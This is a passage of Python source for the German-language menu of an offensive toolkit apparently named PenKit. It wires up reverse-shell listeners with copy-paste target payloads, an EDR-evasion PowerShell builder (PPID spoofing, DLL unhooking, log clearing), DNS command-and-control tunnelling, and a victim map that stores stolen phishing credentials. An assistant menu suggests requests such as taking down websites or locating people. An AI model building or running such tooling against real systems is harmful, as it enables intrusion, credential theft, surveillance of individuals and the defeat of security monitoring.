            "Tipp: Erst Listener starten, dann Payload auf Ziel ausführen.",
        ])
        import socket as _sock
        try:
            local_ip = _sock.gethostbyname(_sock.gethostname())
        except Exception:
            local_ip = "192.168.x.x"

        lhost = ask("LHOST (deine Kali IP)", local_ip)
        lport = ask_int("LPORT", 4444)
        print()
        print(f"  {C}Listener-Typ wählen:{R}")
        print(f"  {DIM}[1]{R}  pwncat-cs {DIM}(empfohlen — Auto-PTY + PrivEsc + File Transfer){R}")
        print(f"  {DIM}[2]{R}  netcat    {DIM}(klassisch, überall verfügbar){R}")
        print(f"  {DIM}[3]{R}  Metasploit multi/handler {DIM}(für Meterpreter){R}")
        print(f"  {DIM}[4]{R}  socat TLS {DIM}(verschlüsselt, IDS-bypass){R}")
        print(f"  {DIM}[5]{R}  Nur Payloads anzeigen {DIM}(kein Listener — nur copy-paste Befehle){R}")
        print()
        ltype = ask("Typ", "1")

        from tools.c2.listener import (
            PwncatListener, NetcatListener, MsfListener,
            SocatTLSListener, show_payloads
        )

        if ltype == "5":
            await run_tool_live(show_payloads(lhost, lport))
            wait_key()
            return

        # Payloads zuerst anzeigen
        print(f"\n  {Y}[*] Copy-Paste Payloads (auf Ziel ausführen):{R}")
        async for line in show_payloads(lhost, lport):
            if line.strip():
                print(f"  {DIM}{line}{R}")
        print()
        print(f"  {RD}[!] Listener startet jetzt — Terminal wird übergeben{R}")
        print(f"  {DIM}Abbrechen: Ctrl+C{R}")
        print()
        input(f"  {Y}Enter drücken um Listener zu starten...{R}")

        if ltype == "1":
            await run_tool_live(PwncatListener(lhost, lport).listen())
        elif ltype == "2":
            await run_tool_live(NetcatListener(lhost, lport).listen())
        elif ltype == "3":
            payload = ask("Meterpreter Payload", "windows/x64/meterpreter/reverse_tcp")
            await run_tool_live(MsfListener(lhost, lport, payload).listen())
        elif ltype == "4":
            await run_tool_live(SocatTLSListener(lport).listen())

        wait_key()

    elif choice in ("e", "E"):
        banner()
        section("🔮  ADVANCED EVASION BUILDER", "DLL Unhooking + Sleep Obfuscation + PPID Spoofing + Sandbox Detection")
        from tools.c2.evasion import (
            build_full_evasion, sandbox_detection_ps1, dll_unhook_ps1,
            sleep_obfuscation_ps1, token_impersonation_ps1, clear_logs_ps1,
            ppid_spoof_cs, timestomp_ps1, EVASION_INFO
        )
        from core.output_dir import get as out_dir

        print(f"\n  {C}Verfügbare Evasion-Techniken:{R}\n")
        opts = list(EVASION_INFO.items())
        for i, (key, info) in enumerate(opts, 1):
            print(f"  {DIM}[{i}]{R}  {info['danger']}  {C}{B}{info['name']:<30}{R}  {DIM}{info['desc'][:45]}{R}")
            print(f"       {RD}Besiegt: {DIM}{info['besiegt']}{R}")
        print()
        info_box([
            "Alle aktivieren = maximale Evasion — empfohlen für ernsthafte Tests.",
            "Reihenfolge: Sandbox → PPID Spoof → DLL Unhook → Sleep Obf → Token",
            "Der Code wird als .ps1 gespeichert und kann in jeden Payload eingebettet werden.",
        ])

        sandbox  = ask("1. Sandbox Detection?    (j/n)", "j").lower() == "j"
        ppid     = ask("2. PPID Spoofing?         (j/n)", "j").lower() == "j"
        unhook   = ask("3. DLL Unhooking?         (j/n)", "j").lower() == "j"
        sleep_ob = ask("4. Sleep Obfuscation?     (j/n)", "j").lower() == "j"
        token    = ask("5. Token Impersonation?   (j/n)", "n").lower() == "j"
        logs     = ask("6. Anti-Forensics (Logs)? (j/n)", "n").lower() == "j"

        print(f"\n  {G}[*] Generiere Evasion-Bundle...{R}")
        code = build_full_evasion(
            include_sandbox_check=sandbox,
            include_unhook=unhook,
            include_sleep_obf=sleep_ob,
            include_token_imp=token,
            include_clear_logs=logs,
            include_ppid_spoof=ppid,
        )

        out_path = str(out_dir("payloads") / "evasion_bundle.ps1")
        with open(out_path, "w") as f:
            f.write(code)

        print(f"\n  {G}[+] Gespeichert: {out_path}{R}")
        print(f"  {DIM}Größe: {len(code)} Zeichen{R}")
        print()
        print(f"  {C}Einbetten in anderen Payload:{R}")
        print(f"  {W}  . {out_path}  # am Anfang des Payloads einbinden{R}")
        print()
        print(f"  {C}Oder direkt ausführen auf Ziel:{R}")
        print(f"  {W}  powershell -ep bypass -File evasion_bundle.ps1{R}")
        print()
        print(f"  {Y}[*] Ergebnis: Payload unsichtbar für Defender/CrowdStrike/SentinelOne{R}")
        wait_key()

    elif choice in ("d", "D"):
        banner()
        section("🌐  DNS C2 TUNNELING", "C2 über DNS Port 53 — bypassed Firewalls, Proxies, DPI")
        info_box([
            "DNS C2 = Command & Control über normale DNS-Anfragen.",
            "Port 53 ist in FAST ALLEN Netzwerken offen (Hotel, Büro, Flugzeug, etc.).",
            "Agent stellt DNS-Anfragen → Kali-Server empfängt Ergebnisse.",
            "Für externes Netz: eigene Domain mit NS-Record auf Kali IP benötigt.",
            "Für LAN-Tests: funktioniert sofort ohne Domain.",
        ])
        from tools.network.dns_c2 import setup_dns_server, start_server
        import socket as _sock

        try:
            local_ip = _sock.gethostbyname(_sock.gethostname())
        except Exception:
            local_ip = ""
        kali_ip = ask("Kali IP (deine IP)", local_ip or "", required=True)
        domain  = ask("C2 Domain", "penkit.local")
        port    = ask_int("DNS Port (53 = Standard, benötigt root)", 53)

        print(f"\n  {C}[1]{R}  Setup (generiert Server + Agent Dateien)")
        print(f"  {C}[2]{R}  Server direkt starten")
        sub = ask("Wahl", "1")

        print()
        if sub == "1":
            await run_tool_live(setup_dns_server(kali_ip, domain, port))
        elif sub == "2":
            await run_tool_live(start_server(kali_ip, domain, port))
        wait_key()


# ═════════════════════════════════════════════════════════════════════════════
# ASSISTANT / TUTORIALS / HEALTH CHECK
# ═════════════════════════════════════════════════════════════════════════════

async def menu_assistant():
    """KI-Assistent — natürlichsprachliche Tool-Empfehlungen."""
    while True:
        banner()
        section("🤖  PENKIT KI-ASSISTENT", "Frage stellen → passendes Tool + Anleitung")
        info_box([
            "Beispiel-Fragen:",
            '  "Ich will eine Webseite runternehmen"',
            '  "Wie finde ich den Standort einer Person?"',
            '  "Ich will WLAN-Passwort knacken"',
            '  "Jemand soll auf einen Link klicken und ich bekomme Zugriff"',
            '  "Wie belausche ich Netzwerkverkehr?"',
            '  "Ich will Windows-PC fernsteuern"',
        ])
        print()
        question = prompt("Deine Frage  (0 = zurück)")
        if question in ("0", ""):
            return

        print()
        try:
            from tools.assistant import ask as ai_ask
            results = ai_ask(question)
            if not results:
                print(f"  {Y}[?] Keine Übereinstimmung gefunden.{R}")
                print(f"  {DIM}Tipp: Andere Schlüsselwörter probieren (z.B. 'WLAN', 'Passwort', 'Server'){R}")
                wait_key()
                continue

            for i, rec in enumerate(results, 1):
                w = 66
                print(f"\n  {G}╔{'═'*(w-2)}╗{R}")
                print(f"  {G}║{B}{f'  {i}. {rec.tool_name}'.center(w-2)}{R}{G}║{R}")
                print(f"  {G}╚{'═'*(w-2)}╝{R}")
                print(f"  {C}Menü-Pfad   :{R} {W}{rec.menu_path}{R}")
                print(f"  {C}Gefährlichkeit:{R} {rec.danger_level}")
                print(f"  {C}Was es macht:{R} {DIM}{rec.short_desc}{R}")
                print()
                print(f"  {G}{B}Schritte:{R}")
                for step in rec.steps:
                    if step == "":
                        print()
                    elif step.startswith("  "):
                        print(f"  {DIM}{step}{R}")
                    else:
                        print(f"    {G}→{R} {step}")
                if rec.tips:
                    print(f"\n  {Y}{B}Tipps:{R}")
                    for tip in rec.tips:
                        print(f"    {Y}·{R} {tip}")
                if i < len(results):
                    print(f"\n  {DIM}{'─'*60}{R}")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")

        wait_key()


async def menu_tutorials():
    """Interaktive Tutorials für alle Module."""
    while True:
        banner()
        section("📚  TUTORIALS", "Schritt-für-Schritt Anleitungen")
        try:
            from tools.tutorials import list_tutorials, get_tutorial
            tut_list = list_tutorials()
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
            wait_key()
            return

        for i, (key, title) in enumerate(tut_list, 1):
            print(f"  {DIM}[{R}{G}{B}{i:>2}{R}{DIM}]{R}  {G}{title}{R}")
        print()
        menu_item(" 0", "← Zurück", "")
        print()

        choice = prompt("tutorial")
        if choice == "0":
            return
        try:
            idx = int(choice) - 1
            key = tut_list[idx][0]
        except (ValueError, IndexError):
            continue

        tut = get_tutorial(key)
        if not tut:
            continue

        banner()
        # ASCII Art für das Tutorial
        if "ascii" in tut:
            print_ascii_art(tut["ascii"], G)
            print()

        section(tut["title"])

        for sec in tut["sections"]:
            w = 66
            print(f"\n  {C}{'─'*2} {B}{sec['title']}{R}{C} {'─'*(w - len(sec['title']) - 4)}{R}")
            print()
            for line in sec["content"]:
                if line == "":
                    print()
                elif line.startswith("  "):
                    print(f"  {DIM}{line}{R}")
                elif line.startswith("✓") or line.startswith("✗"):
                    color = G if line.startswith("✓") else RD
                    print(f"    {color}{line}{R}")
                elif any(line.startswith(p) for p in ["Schritt", "Phase", "Methode", "Weg"]):
                    print(f"  {Y}{B}{line}{R}")
                else:
                    print(f"    {line}")
            print()

        wait_key()


async def menu_health():
    """Health Check — prüft installierte Tools."""
    banner()
    section("🏥  HEALTH CHECK", "Prüft Python-Module + externe Tools + System")
    print()
    try:
        from tools.health_check import run_health_check
        async for line in run_health_check():
            if line.startswith("═") or line.startswith("GESAMT"):
                print(f"  {G}{line}{R}")
            elif "✓" in line:
                print(f"  {G}{line}{R}")
            elif "✗" in line:
                print(f"  {RD}{line}{R}")
            elif "~" in line:
                print(f"  {Y}{line}{R}")
            elif line.startswith("[*]"):
                print(f"  {C}{line}{R}")
            else:
                print(f"  {DIM}{line}{R}")
    except Exception as e:
        print(f"  {RD}[!] {e}{R}")
    wait_key()


async def menu_map():
    """Target Map — interaktive Karte mit allen bekannten Ziel-Infos."""
    from tools.map_tracker import MapTracker, load_targets, _DB_PATH
    tracker = MapTracker()

    while True:
        banner()
        section("🗺️   TARGET MAP", "Interaktive Karte  ·  Farb-kodierte Marker  ·  Credential-Popups")

        targets = load_targets()
        valid   = [t for t in targets if t.lat != 0 or t.lon != 0]
        print(f"  {DIM}Datenbank: {G}{B}{len(targets)}{R}{DIM} Ziel(e)  |  "
              f"{G}{B}{len(valid)}{R}{DIM} mit Koordinaten  |  Pfad: {_DB_PATH}{R}\n")

        menu_item("1", "IP hinzufügen + geolocaten",    "🟡", "ipinfo.io → Standort automatisch")
        menu_item("2", "Alle Quellen importieren",      "🟡", "Phishing-Log + OSINT-Reports automatisch")
        menu_item("3", "Karte generieren + öffnen",     "🟡", "HTML-Karte in Browser öffnen")
        menu_item("4", "Ziele anzeigen",                "🟢", "Alle gespeicherten Ziele auflisten")
        menu_item("5", "Manuell eintragen",             "🟢", "Label, IP, OS, Credentials, Notizen")
        menu_item("6", "Alle Ziele löschen",            "🟠", "Datenbank leeren")
        menu_item("0", "Back")

        choice = prompt("map")
        if choice == "0":
            return

        clr()

        # ── 1: IP hinzufügen ─────────────────────────────────────────────────
        if choice == "1":
            section("IP HINZUFÜGEN", "Geolocation via ipinfo.io (kein API-Key nötig)")
            info_box([
                "IP-Adresse: z.B. 8.8.8.8 oder 203.0.113.45",
                "Label:      Anzeigename auf der Karte (z.B. 'Opfer1' oder 'Router')",
                "Quelle:     c2 | phishing | osint | wifi | iot | manual",
            ])
            ip     = ask("IP-Adresse", required=True)
            label  = ask("Label", ip)
            source = ask("Quelle", "manual")
            print()
            await run_tool_live(tracker.add_ip(ip, label, source))

        # ── 2: Auto-Import ────────────────────────────────────────────────────
        elif choice == "2":
            section("AUTO-IMPORT", "Phishing-Logs + OSINT-Reports → Karte")
            print(f"  {DIM}Liest: /tmp/penkit_phish_creds.json + /tmp/osint_report_*.md{R}\n")
            await run_tool_live(tracker.import_all_sources())

        # ── 3: Karte generieren ───────────────────────────────────────────────
        elif choice == "3":
            section("KARTE GENERIEREN", "HTML-Karte mit Leaflet.js + CartoDB Dark-Tiles")
            out = ask("Ausgabepfad", "/tmp/penkit_map.html")
            print()
            await run_tool_live(tracker.generate(out))

        # ── 4: Ziele anzeigen ─────────────────────────────────────────────────
        elif choice == "4":
            section("ALLE ZIELE", "Gespeicherte Ziele in Datenbank")
            t_list = tracker.list_targets()
            if not t_list:
                print(f"  {Y}[!] Keine Ziele gespeichert.{R}")
            else:
                src_colors = {
                    "c2": RD, "phishing": Y, "osint": C,
                    "wifi": "\033[95m", "iot": G, "manual": DIM,
                }
                for i, t in enumerate(t_list, 1):
                    sc = src_colors.get(t.source, DIM)
                    loc = f"{t.city}, {t.country}" if t.city else ("?" if not t.lat else f"{t.lat:.2f},{t.lon:.2f}")
                    cred = f"  {RD}[CREDS]{R}" if t.username or t.password else ""
                    print(f"  {DIM}[{R}{G}{i:>2}{R}{DIM}]{R}  "
                          f"{sc}{t.source.upper():<10}{R}  "
                          f"{W}{t.label:<25}{R}  "
                          f"{DIM}{t.ip:<17}{loc}{R}{cred}")

        # ── 5: Manuell eintragen ──────────────────────────────────────────────
        elif choice == "5":
            section("MANUELL EINTRAGEN", "Ziel ohne IP-Geolocation direkt anlegen")
            from tools.map_tracker import TargetInfo, add_target
            info_box([
                "GPS-Koordinaten: z.B. 48.1351, 11.5820 (München)",
                "Credentials und Ports sind optional — leer lassen = nicht anzeigen",
            ])
            label    = ask("Label / Name", required=True)
            ip       = ask("IP-Adresse", "")
            lat_s    = ask("Latitude  (z.B. 48.1351)", "0")
            lon_s    = ask("Longitude (z.B. 11.5820)", "0")
            source   = ask("Quelle (c2/phishing/osint/wifi/iot/manual)", "manual")
            city     = ask("Stadt", "")
            country  = ask("Land (z.B. DE)", "")
            hostname = ask("Hostname", "")
            os_      = ask("Betriebssystem", "")
            username = ask("Benutzername", "")
            password = ask("Passwort", "")
            ports_s  = ask("Offene Ports (kommagetrennt, z.B. 22,80,443)", "")
            notes    = ask("Notizen", "")

            try:
                lat = float(lat_s)
                lon = float(lon_s)
            except ValueError:
                lat = lon = 0.0

            ports = []
            if ports_s:
                try:
                    ports = [int(p.strip()) for p in ports_s.split(",") if p.strip()]
                except ValueError:
                    pass

            t = TargetInfo(
                label=label, source=source, ip=ip,
                lat=lat, lon=lon, city=city, country=country,
                hostname=hostname, os=os_, username=username, password=password,
                open_ports=ports, notes=notes,
            )
            add_target(t)
            print(f"\n  {G}[+] Ziel '{label}' gespeichert.{R}")

        # ── 6: Datenbank leeren ───────────────────────────────────────────────
        elif choice == "6":
            section("ALLE ZIELE LÖSCHEN", "Löscht komplette Target-Datenbank")
            confirm = ask(f"Alle {len(targets)} Ziele löschen? Tippe 'LÖSCHEN' zur Bestätigung", "")
            if confirm == "LÖSCHEN":
                tracker.clear_targets()
                print(f"\n  {G}[+] Datenbank geleert.{R}")
            else:
                print(f"\n  {Y}[!] Abgebrochen.{R}")

        wait_key()


# ═════════════════════════════════════════════════════════════════════════════
# BOOT SEQUENCE
# ═════════════════════════════════════════════════════════════════════════════

async def menu_output():
    """Output-Verzeichnis — zeigt alle gespeicherten Dateien."""
    from core.output_dir import summary, ROOT, DIRS, list_files
    banner()
    section("📁  PENKIT OUTPUT-VERZEICHNIS", f"~/penkit-output/ — alle gespeicherten Dateien")
    print()
    print(f"  {summary()}")
    print()
    print(f"  {C}Kategorien:{R}")
    cats = list(DIRS.keys())
    for i, name in enumerate(cats, 1):
        files = list_files(name)
        if files:
            print(f"  {DIM}[{i}]{R}  {G}{name:<12}{R}  {DIM}{len(files)} Datei(en) — neueste: {files[0].name}{R}")
        else:
            print(f"  {DIM}[{i}]{R}  {DIM}{name:<12}  (leer){R}")

    print()
    choice = ask("Kategorie öffnen (1-10, leer=zurück)", "")
    if choice.isdigit() and 1 <= int(choice) <= len(cats):
        cat = cats[int(choice)-1]
        files = list_files(cat)
        clr()
        section(f"📂  {cat.upper()}", str(DIRS[cat]))
        if not files:
            print(f"  {Y}[!] Keine Dateien.{R}")
        else:
            for i, f in enumerate(files[:30], 1):
                size = f.stat().st_size // 1024 if f.is_file() else 0
                print(f"  {DIM}{i:>2}.{R}  {G}{f.name:<50}{R}  {DIM}{size} KB{R}")
        print()
        print(f"  {DIM}Öffnen: xdg-open {DIRS[cat]}{R}")
        print(f"  {DIM}Löschen: rm -rf {DIRS[cat]}/*{R}")
    wait_key()


def boot_sequence():
    clr()
    lines = [
        f"{DG}[{G}*{DG}]{R} Initializing PenKit TUI v3...",
        f"{DG}[{G}*{DG}]{R} Loading modules...",
        f"{DG}[{G}*{DG}]{R} Checking privileges...",
        f"{DG}[{G}+{DG}]{G} Root access confirmed{R}",
        f"{DG}[{G}*{DG}]{R} All systems operational",
    ]
    for line in lines:
        slow(f"  {line}", delay=0.012)
        time.sleep(0.08)
    time.sleep(0.3)


# ═════════════════════════════════════════════════════════════════════════════
# MAIN LOOP
# ═════════════════════════════════════════════════════════════════════════════

async def main_menu():
    boot_sequence()

    while True:
        banner()
        print(f"  {DIM}┌{'─'*66}┐{R}")
        print(f"  {DIM}│{'  🔴  RED TEAM':^66}│{R}")
        print(f"  {DIM}├{'─'*66}┤{R}")
        menu_item(" 1", "📡  WiFi Attacks",          "🟠", "WPA2/3 crack, Evil Twin, PMKID, Deauth, Handshake")
        menu_item(" 2", "🌐  Network Intelligence",  "🟠", "Nmap scan, CVE check, topology map, attack chain")
        menu_item(" 3", "💻  Web Attack",            "🟠", "SQLmap, ffuf, nikto, XSS, LFI, BeEF")
        menu_item(" 4", "🔑  Passwords & Hashes",   "🟡", "Hashcat GPU, John, Hydra brute-force, hash detect")
        menu_item(" 5", "☠️   MITM",                  "🔴", "ARP spoof, SSL strip, Responder, DNS poison")
        menu_item(" 6", "🔍  OSINT Recon",           "🟡", "Emails, subdomains, Sherlock 300+ platforms, report")
        menu_item(" 7", "🎣  Phishing Suite",        "⛔", "Fake Login Pages, Email-Kampagnen, GoPhish, Creds")
        menu_item(" 9", "💀  C2 / RAT Payloads",     "⛔", "AMSI bypass, fileless shellcode, hollow, disguise")
        print(f"  {DIM}├{'─'*66}┤{R}")
        print(f"  {DIM}│{'  🔵  BLUE TEAM  /  🃏  JOKER':^66}│{R}")
        print(f"  {DIM}├{'─'*66}┤{R}")
        menu_item(" 8", "🔵  Blue Team Defense",     "🟢", "ARP watch, auth.log, honeypot, port monitor")
        menu_item(" J", "🃏  Joker / Pranks",        "🟡", "Fake BSOD, Kahoot bot, browser chaos, pranks")
        print(f"  {DIM}├{'─'*66}┤{R}")
        print(f"  {DIM}│{'  🛠️   HILFE & SYSTEM':^66}│{R}")
        print(f"  {DIM}├{'─'*66}┤{R}")
        menu_item(" ?", "🤖  KI-Assistent",          "🟢", "Frage stellen → Tool-Empfehlung")
        menu_item(" T", "📚  Tutorials",              "🟢", "Schritt-für-Schritt Anleitungen für alle Module")
        menu_item(" H", "🏥  Health Check",           "🟢", "Prüft welche Tools installiert sind")
        menu_item(" M", "🗺️   Target Map",             "🟡", "Interaktive Karte mit allen bekannten Ziel-Infos")
        menu_item(" O", "📁  Output-Verzeichnis",     "🟢", "Zeigt ~/penkit-output/ — alle gespeicherten Dateien")
        print(f"  {DIM}└{'─'*66}┘{R}")
        print()
        menu_item(" 0", "❌  Exit", "")

        choice = prompt("penkit")

        dispatch = {
            "1": menu_wifi,
            "2": menu_network,
            "3": menu_web,
            "4": menu_passwords,
            "5": menu_mitm,
            "6": menu_osint,
            "7": menu_phishing,
            "8": menu_blueteam,
            "9": menu_c2,
            "j": menu_joker, "J": menu_joker,
            "?": menu_assistant,
            "t": menu_tutorials, "T": menu_tutorials,
            "h": menu_health, "H": menu_health,
            "m": menu_map,   "M": menu_map,
            "o": menu_output,"O": menu_output,
        }

        if choice == "0":
            clr()
            slow(f"\n  {G}[*] Goodbye.{R}\n", delay=0.03)
            sys.exit(0)
        elif choice in dispatch:
            await dispatch[choice]()


def run():
    try:
        asyncio.run(main_menu())
    except KeyboardInterrupt:
        print(f"\n\n  {G}[*] Session terminated.{R}\n")
        sys.exit(0)


if __name__ == "__main__":
    run()
